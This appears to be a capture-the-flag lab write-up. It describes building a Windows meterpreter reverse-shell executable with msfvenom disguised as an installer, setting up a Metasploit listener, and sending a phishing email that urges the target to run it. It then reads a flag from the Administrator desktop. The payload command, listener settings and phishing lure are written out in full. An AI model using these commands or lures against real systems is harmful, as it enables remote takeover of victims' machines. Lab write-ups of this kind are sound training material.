### Generating the Malicious Executable 

This challenge was very similar to Phantom so the thought process was the same. Offsec has a section for Metasploit Unleashed with a exploit payload called MSFVENOM. From there, the next steps were to identify the criteria from email and do more research on MSFVENOM.

This is what I ended up crafting up

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.212.180 LPORT=8888 -f exe > SilentEdge_Installer.exe
```

### Listener Setup

Once the payload was generated, I configured Metasploit to listen for incoming connections

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=10.10.212.180
set LPORT=8888
exploit -j
```

### Delivering the payload

The generated SilentEdge_Installer.exe was sent via a phishing email to the target, instructing them to execute it.

This was the phishing email I crafted as well

```bash
Subject: SilentEdge Installer - Phase 2
Cipher,
The latest SilentEdge Installer is built and ready for deployment...

Download and execute: SilentEdge_Installer.exe

Keep this confidential.

### Gaining Remote Access & Post-Exploitation

The reverse shell hooked, and once again I navigated to the desktop:

```bash
cd c:/users/Administrator/Desktop
ls
cat flag.txt
```

And Voila! Flag found.
